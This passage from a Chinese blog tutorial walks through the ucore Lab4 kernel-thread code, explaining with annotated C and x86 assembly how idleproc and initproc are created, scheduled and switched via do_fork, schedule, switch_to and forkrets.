进程与线程</h4><p>一个进程拥有一个存放程序和数据的的虚拟地址空间以及其他资源。一个进程基于程序的指令流执行，其执行过程可能与其它进程的执行过程交替进行。因此，一个具有执行状态（运行态、就绪态等）的进程是一个被操作系统分配资源（比如分配内存）并调度（比如分时使用CPU）的单位。在大多数操作系统中，这两个特点是进程的主要本质特征。但这两个特征相对独立，操作系统可以把这两个特征分别进行管理。</p><p>这样可以把拥有资源所有权的单位通常仍称作进程，对资源的管理成为进程管理；把指令执行流的单位称为线程，对线程的管理就是线程调度和线程分派。对属于同一进程的所有线程而言，这些线程共享进程的虚拟地址空间和其他资源，但每个线程都有一个独立的栈，还有独立的线程运行上下文，用于包含表示线程执行现场的寄存器值等信息。</p><p>在多线程环境中，进程被定义成资源分配与保护的单位，与进程相关联的信息主要有存放进程映像的虚拟地址空间等。在一个进程中，可能有一个或多个线程，每个线程有线程执行状态（运行、就绪、等待等），保存上次运行时的线程上下文、线程的执行栈等。考虑到CPU有不同的特权模式，参照进程的分类，线程又可进一步细化为用户线程和内核线程。</p><p>到目前为止，我们就可以明确用户进程、内核进程（可把ucore看成一个内核进程）、用户线程、内核线程的区别了。从本质上看，线程就是一个特殊的不用拥有资源的轻量级进程，在ucore的调度和执行管理中，并没有区分线程和进程。且由于ucore内核中的所有内核线程共享一个内核地址空间和其他资源，所以这些内核线程从属于同一个唯一的内核进程，即ucore内核本身。理解了进程或线程的上述属性和特征，就可以进行进程/线程管理的设计与实现了。但是为了叙述上的简便，以下用户态的进程/线程统称为用户进程。</p></blockquote><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="详细解析initproc生成及调度——ucore-Lab4"><a href="#详细解析initproc生成及调度——ucore-Lab4" class="headerlink" title="详细解析initproc生成及调度——ucore Lab4"></a>详细解析initproc生成及调度——ucore Lab4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file: kern/init/init.c</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">kern_init(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="comment">/* omitted */</span></span><br><span class="line">proc_init();</span><br><span class="line">    <span class="comment">/* omitted */</span></span><br><span class="line">    cpu_idle();   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>kern_init</code>完成内存管理等操作后，调用<code>proc_init</code>，在其中完成了两个内核线程<code>idleproc</code>和<code>initproc</code>的创建。之后调用了<code>cpu_idle</code>完成了首次的内核线程的切换。</p><h3 id="proc-init"><a href="#proc-init" class="headerlink" title="proc_init"></a>proc_init</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file: kern/process/proc.c</span></span><br><span class="line"><span class="comment">// proc_init - set up the first kernel thread idleproc &quot;idle&quot; by itself and </span></span><br><span class="line"><span class="comment">//           - create the second kernel thread init_main</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">proc_init(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    list_init(&amp;proc_list);<span class="comment">// 初始化链接进程PCB和线程TCB的双向链表</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; HASH_LIST_SIZE; i ++) &#123;</span><br><span class="line">        list_init(hash_list + i);<span class="comment">// 为了快速查找，使用了哈希，pid哈希一样的链接在一起</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((idleproc = alloc_proc()) == <span class="literal">NULL</span>) &#123;<span class="comment">// 分配proc_struct空间并初始化，ucore中TCB和PCB的</span></span><br><span class="line">        panic(<span class="string">&quot;cannot alloc idleproc.\n&quot;</span>);<span class="comment">// 结构一样</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    idleproc-&gt;pid = <span class="number">0</span>;<span class="comment">// 初始化idle_proc进程信息，idle_proc就是内核当前执</span></span><br><span class="line">    idleproc-&gt;state = PROC_RUNNABLE;<span class="comment">// 行的上下文。初始化完成后就没有其他的工作了，所以将其</span></span><br><span class="line">    idleproc-&gt;kstack = (<span class="keyword">uintptr_t</span>)bootstack;<span class="comment">// need_resched设为1，调度其他进程(线程)占用CPU进行</span></span><br><span class="line">    idleproc-&gt;need_resched = <span class="number">1</span>;<span class="comment">// 工作</span></span><br><span class="line">    set_proc_name(idleproc, <span class="string">&quot;idle&quot;</span>);</span><br><span class="line">    nr_process ++;</span><br><span class="line"></span><br><span class="line">    current = idleproc;<span class="comment">// 设置当前运行进程(线程)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pid = kernel_thread(init_main, <span class="string">&quot;Hello world!!&quot;</span>, <span class="number">0</span>);<span class="comment">// 创建第二个内核线程</span></span><br><span class="line">    <span class="keyword">if</span> (pid &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        panic(<span class="string">&quot;create init_main failed.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    initproc = find_proc(pid);</span><br><span class="line">    set_proc_name(initproc, <span class="string">&quot;init&quot;</span>);</span><br><span class="line"></span><br><span class="line">    assert(idleproc != <span class="literal">NULL</span> &amp;&amp; idleproc-&gt;pid == <span class="number">0</span>);</span><br><span class="line">    assert(initproc != <span class="literal">NULL</span> &amp;&amp; initproc-&gt;pid == <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>kernel_thread</code>使用函数<code>fn</code>，参数<code>arg</code>创建内核线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel_thread - create a kernel thread using &quot;fn&quot; function</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> the contents of temp trapframe tf will be copied to </span></span><br><span class="line"><span class="comment">//       proc-&gt;tf in do_fork--&gt;copy_thread function</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">kernel_thread(<span class="keyword">int</span> (*fn)(<span class="keyword">void</span> *), <span class="keyword">void</span> *arg, <span class="keyword">uint32_t</span> clone_flags) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> <span class="title">tf</span>;</span><span class="comment">// 在内核栈中临时分配中断帧</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;tf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line">    tf.tf_cs = KERNEL_CS;</span><br><span class="line">    tf.tf_ds = tf.tf_es = tf.tf_ss = KERNEL_DS;</span><br><span class="line">    tf.tf_regs.reg_ebx = (<span class="keyword">uint32_t</span>)fn;<span class="comment">// 设置函数执行起始地址</span></span><br><span class="line">    tf.tf_regs.reg_edx = (<span class="keyword">uint32_t</span>)arg;<span class="comment">// 设置参数数组的起始地址</span></span><br><span class="line">    tf.tf_eip = (<span class="keyword">uint32_t</span>)kernel_thread_entry;<span class="comment">// 设置线程开始执行的起始地址</span></span><br><span class="line">    <span class="keyword">return</span> do_fork(clone_flags | CLONE_VM, <span class="number">0</span>, &amp;tf);<span class="comment">// 创建线程空间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>kernel_thread_entry</code>在<code>kern/process/entry.S</code>中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.globl kernel_thread_entry</span><br><span class="line">kernel_thread_entry:        # void kernel_thread(void)</span><br><span class="line"></span><br><span class="line">    pushl %edx              # push arg&#x2F;&#x2F; 将函数的第一个参数压栈</span><br><span class="line">    call *%ebx              # call fn&#x2F;&#x2F; 调用线程执行例程</span><br><span class="line"></span><br><span class="line">    pushl %eax              # save the return value of fn(arg)&#x2F;&#x2F; 将函数执行结果，作为do_exit</span><br><span class="line">    #&#x2F;&#x2F; 参数压栈</span><br><span class="line">    call do_exit            # call do_exit to terminate current thread &#x2F;&#x2F; 执行线程退出操作</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>do_fork</code>根据clone_flags实际分配进程的空间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* do_fork -     parent process for a new child process</span></span><br><span class="line"><span class="comment"> * @clone_flags: used to guide how to clone the child process</span></span><br><span class="line"><span class="comment"> * @stack:       the parent&#x27;s user stack pointer. if stack==0, It means to fork a kernel thread.</span></span><br><span class="line"><span class="comment"> * @tf:          the trapframe info, which will be copied to child process&#x27;s proc-&gt;tf</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">do_fork(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf) &#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_FREE_PROC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (nr_process &gt;= MAX_PROCESS) &#123;</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line">    <span class="comment">//LAB4:EXERCISE2 YOUR CODE</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Some Useful MACROs, Functions and DEFINEs, you can use them in below implementation.</span></span><br><span class="line"><span class="comment">     * MACROs or Functions:</span></span><br><span class="line"><span class="comment">     *   alloc_proc:   create a proc struct and init fields (lab4:exercise1)</span></span><br><span class="line"><span class="comment">     *   setup_kstack: alloc pages with size KSTACKPAGE as process kernel stack</span></span><br><span class="line"><span class="comment">     *   copy_mm:      process &quot;proc&quot; duplicate OR share process &quot;current&quot;&#x27;s mm according clone_flags</span></span><br><span class="line"><span class="comment">     *                 if clone_flags &amp; CLONE_VM, then &quot;share&quot; ; else &quot;duplicate&quot;</span></span><br><span class="line"><span class="comment">     *   copy_thread:  setup the trapframe on the  process&#x27;s kernel stack top and</span></span><br><span class="line"><span class="comment">     *                 setup the kernel entry point and stack of process</span></span><br><span class="line"><span class="comment">     *   hash_proc:    add proc into proc hash_list</span></span><br><span class="line"><span class="comment">     *   get_pid:      alloc a unique pid for process</span></span><br><span class="line"><span class="comment">     *   wakeup_proc:  set proc-&gt;state = PROC_RUNNABLE</span></span><br><span class="line"><span class="comment">     * VARIABLES:</span></span><br><span class="line"><span class="comment">     *   proc_list:    the process set&#x27;s list</span></span><br><span class="line"><span class="comment">     *   nr_process:   the number of process set</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//    1. call alloc_proc to allocate a proc_struct</span></span><br><span class="line">    <span class="comment">//    2. call setup_kstack to allocate a kernel stack for child process</span></span><br><span class="line">    <span class="comment">//    3. call copy_mm to dup OR share mm according clone_flag</span></span><br><span class="line">    <span class="comment">//    4. call copy_thread to setup tf &amp; context in proc_struct</span></span><br><span class="line">    <span class="comment">//    5. insert proc_struct into hash_list &amp;&amp; proc_list</span></span><br><span class="line">    <span class="comment">//    6. call wakeup_proc to make the new child process RUNNABLE</span></span><br><span class="line">    <span class="comment">//    7. set ret vaule using child proc&#x27;s pid</span></span><br><span class="line">    <span class="keyword">if</span> ((proc = alloc_proc()) == <span class="literal">NULL</span>) &#123;<span class="comment">// 创建TCB(PCB)</span></span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line">    proc-&gt;parent = current;<span class="comment">// 设置父进程</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (setup_kstack(proc) != <span class="number">0</span>) &#123;<span class="comment">// 创建内核栈，每个线程都有自己的栈</span></span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_proc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (copy_mm(clone_flags, proc) != <span class="number">0</span>) &#123;<span class="comment">// CLONE_VM指共享程序空间，这里指共享内核空间</span></span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_kstack;</span><br><span class="line">    &#125;</span><br><span class="line">    copy_thread(proc, <span class="built_in">stack</span>, tf);<span class="comment">// 设置中断帧和上下文</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);<span class="comment">// 设置线程(进程)pid，添加到列表</span></span><br><span class="line">    &#123;</span><br><span class="line">        proc-&gt;pid = get_pid();</span><br><span class="line">        hash_proc(proc);</span><br><span class="line">        list_add(&amp;proc_list, &amp;(proc-&gt;list_link));</span><br><span class="line">        nr_process++;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    </span><br><span class="line">    wakeup_proc(proc);<span class="comment">// 创建完毕，使其就绪</span></span><br><span class="line">    ret = proc-&gt;pid;</span><br><span class="line">fork_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">bad_fork_cleanup_kstack:</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">bad_fork_cleanup_proc:</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">goto</span> fork_out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>copy_thread</code>设置程序调度所需的中断帧(后面详解)，和程序上下文。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// copy_thread - setup the trapframe on the  process&#x27;s kernel stack top and</span></span><br><span class="line"><span class="comment">//             - setup the kernel entry point and stack of process</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">copy_thread(struct proc_struct *proc, <span class="keyword">uintptr_t</span> esp, struct trapframe *tf) &#123;</span><br><span class="line">    proc-&gt;tf = (struct trapframe *)(proc-&gt;kstack + KSTACKSIZE) - <span class="number">1</span>; <span class="comment">// 在程序内核栈开始地方分</span></span><br><span class="line">    <span class="comment">// 配一个trapframe空间</span></span><br><span class="line">    *(proc-&gt;tf) = *tf;<span class="comment">// 设置程序中断帧</span></span><br><span class="line">    proc-&gt;tf-&gt;tf_regs.reg_eax = <span class="number">0</span>;</span><br><span class="line">    proc-&gt;tf-&gt;tf_esp = esp;                 <span class="comment">// 这句在创建内核栈中没有作用(是为用户进程设置用户栈)</span></span><br><span class="line">    proc-&gt;tf-&gt;tf_eflags |= FL_IF;<span class="comment">// 使能中断</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置程序执行的上下文，在该内核线程被调度之后，将首先执行forkret函数</span></span><br><span class="line">    proc-&gt;context.eip = (<span class="keyword">uintptr_t</span>)forkret;<span class="comment">// 设置调度后的起始执行地址</span></span><br><span class="line">    proc-&gt;context.esp = (<span class="keyword">uintptr_t</span>)(proc-&gt;tf);<span class="comment">// 设置程序上下文中所利用的堆栈</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cpu-idle"><a href="#cpu-idle" class="headerlink" title="cpu_idle"></a>cpu_idle</h3><p>创建完内核线程<code>idleproc</code>，<code>initproc</code>。当前运行的内核线程即为<code>idleproc</code>，已经设置好该线程<code>need_resched = 1</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">cpu_idle(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;need_resched) &#123;</span><br><span class="line">            schedule();<span class="comment">// 当检查到当前进程需要调度的时候，就执行schedule</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>schedule</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">schedule(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *le, *last;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">next</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        current-&gt;need_resched = <span class="number">0</span>;</span><br><span class="line">        last = (current == idleproc) ? &amp;proc_list : &amp;(current-&gt;list_link);</span><br><span class="line">        le = last;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((le = list_next(le)) != &amp;proc_list) &#123;</span><br><span class="line">                next = le2proc(le, list_link);</span><br><span class="line">                <span class="keyword">if</span> (next-&gt;state == PROC_RUNNABLE) &#123;<span class="comment">// 顺序查找下一个runnable</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (le != last);</span><br><span class="line">        <span class="keyword">if</span> (next == <span class="literal">NULL</span> || next-&gt;state != PROC_RUNNABLE) &#123;</span><br><span class="line">            next = idleproc;</span><br><span class="line">        &#125;</span><br><span class="line">        next-&gt;runs ++;</span><br><span class="line">        <span class="keyword">if</span> (next != current) &#123;</span><br><span class="line">            proc_run(next);<span class="comment">// 调用proc_run进行执行上下文的切换</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>proc_run</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">proc_run(struct proc_struct *proc) &#123;</span><br><span class="line">    <span class="keyword">if</span> (proc != current) &#123;</span><br><span class="line">        <span class="keyword">bool</span> intr_flag;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">prev</span> = <span class="title">current</span>, *<span class="title">next</span> = <span class="title">proc</span>;</span></span><br><span class="line">        local_intr_save(intr_flag);</span><br><span class="line">        &#123;</span><br><span class="line">            current = proc;</span><br><span class="line">            load_esp0(next-&gt;kstack + KSTACKSIZE);<span class="comment">// 设置TSS中的内核栈，进入内核状态时使用</span></span><br><span class="line">            lcr3(next-&gt;cr3);<span class="comment">// 加载页表</span></span><br><span class="line">            switch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context));<span class="comment">// 切换上下文</span></span><br><span class="line">        &#125;</span><br><span class="line">        local_intr_restore(intr_flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>switch_to</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.globl switch_to</span><br><span class="line">switch_to:                      # switch_to(from, to)</span><br><span class="line"></span><br><span class="line">    # save from&#39;s registers</span><br><span class="line">    movl 4(%esp), %eax          # eax points to from&#x2F;&#x2F; 取第一个参数from</span><br><span class="line">    popl 0(%eax)                # save eip !popl       &#x2F;&#x2F; 保存call压栈的函数返回地址</span><br><span class="line">    movl %esp, 4(%eax)          # save esp::context of from</span><br><span class="line">    movl %ebx, 8(%eax)          # save ebx::context of from</span><br><span class="line">    movl %ecx, 12(%eax)         # save ecx::context of from</span><br><span class="line">    movl %edx, 16(%eax)         # save edx::context of from</span><br><span class="line">    movl %esi, 20(%eax)         # save esi::context of from</span><br><span class="line">    movl %edi, 24(%eax)         # save edi::context of from</span><br><span class="line">    movl %ebp, 28(%eax)         # save ebp::context of from</span><br><span class="line"></span><br><span class="line">    # restore to&#39;s registers</span><br><span class="line">    movl 4(%esp), %eax          # not 8(%esp): popped return address already</span><br><span class="line">                                # eax now points to to</span><br><span class="line">    movl 28(%eax), %ebp         # restore ebp::context of to</span><br><span class="line">    movl 24(%eax), %edi         # restore edi::context of to</span><br><span class="line">    movl 20(%eax), %esi         # restore esi::context of to</span><br><span class="line">    movl 16(%eax), %edx         # restore edx::context of to</span><br><span class="line">    movl 12(%eax), %ecx         # restore ecx::context of to</span><br><span class="line">    movl 8(%eax), %ebx          # restore ebx::context of to</span><br><span class="line">    movl 4(%eax), %esp          # restore esp::context of to</span><br><span class="line"></span><br><span class="line">    pushl 0(%eax)               # push eip&#x2F;&#x2F; 压栈EIP，充当ret返回地址</span><br><span class="line"></span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>此处ret使用的EIP是线程context中存储的函数<code>fortret</code>地址</p><p><code>forkret</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">forkret(<span class="keyword">void</span>) &#123;</span><br><span class="line">    forkrets(current-&gt;tf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>forkret</code>传入中断帧调用<code>trapentry.S</code>中的<code>forkrets</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.globl __trapret</span><br><span class="line">__trapret:</span><br><span class="line">    # restore registers from stack</span><br><span class="line">    popal</span><br><span class="line"></span><br><span class="line">    # restore %ds, %es, %fs and %gs</span><br><span class="line">    popl %gs</span><br><span class="line">    popl %fs</span><br><span class="line">    popl %es</span><br><span class="line">    popl %ds</span><br><span class="line"></span><br><span class="line">    # get rid of the trap number and error code</span><br><span class="line">    addl $0x8, %esp</span><br><span class="line">    iret</span><br><span class="line"></span><br><span class="line">.globl forkrets</span><br><span class="line">forkrets:</span><br><span class="line">    # set stack to this new process&#39;s trapframe</span><br><span class="line">    movl 4(%esp), %esp</span><br><span class="line">    jmp __trapret</span><br></pre></td></tr></table></figure><p><code>forkrets</code>利用程序内核栈顶的<code>struct trapframe</code>装作从中断处返回到线程(进程)。从终端中返回时就用到了前面<code>tf.tf_eip = (uint32_t)kernel_thread_entry;</code>，此后就跳转到了<code>kernel_thread_entry</code>执行。</p><p><code>kernel_thread_entry</code>中使用的<code>edx</code>，<code>ebx</code>也都是在tf中存的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.globl kernel_thread_entry</span><br><span class="line">kernel_thread_entry:        # void kernel_thread(void)</span><br><span class="line"></span><br><span class="line">    pushl %edx              # push arg&#x2F;&#x2F; 压入函数参数，后调用</span><br><span class="line">    call *%ebx              # call fn</span><br><span class="line"></span><br><span class="line">    pushl %eax              # save the return value of fn(arg)&#x2F;&#x2F; 返回时，利用返回值</span><br><span class="line">    call do_exit            # call do_exit to terminate current thread&#x2F;&#x2F; 作为参数do_exit</span><br></pre></td></tr></table></figure><p>到这里线程就切换成功了。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;内核线程管理&quot;&gt;&lt;a href=&quot;#内核线程管理&quot; class=&quot;headerlink&quot; title=&quot;内核线程管理&quot;&gt;&lt;/a&gt;内核线程管理&lt;/h1&gt;&lt;h2 id=&quot;实验执行流程综述&quot;&gt;&lt;a href=&quot;#实验执行流程综述&quot; class=&quot;headerlink&quot; title=&quot;实验执行流程综述&quot;&gt;&lt;/a&gt;实验执行流程综述&lt;/h2&gt;&lt;p&gt;内核线程是一种特殊的进程，内核线程与用户进程的区别有两个：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;内核线程只运行在内核态而用户进程会在在用户态和内核态交替运行；&lt;/li&gt;
&lt;li&gt;所有内核线程直接使用共同的ucore内核内存空间，不需为每个内核线程维护单独的内存空间而用户进程需要维护各自的用户内存空间。&lt;/li&gt;
&lt;/ul&gt;
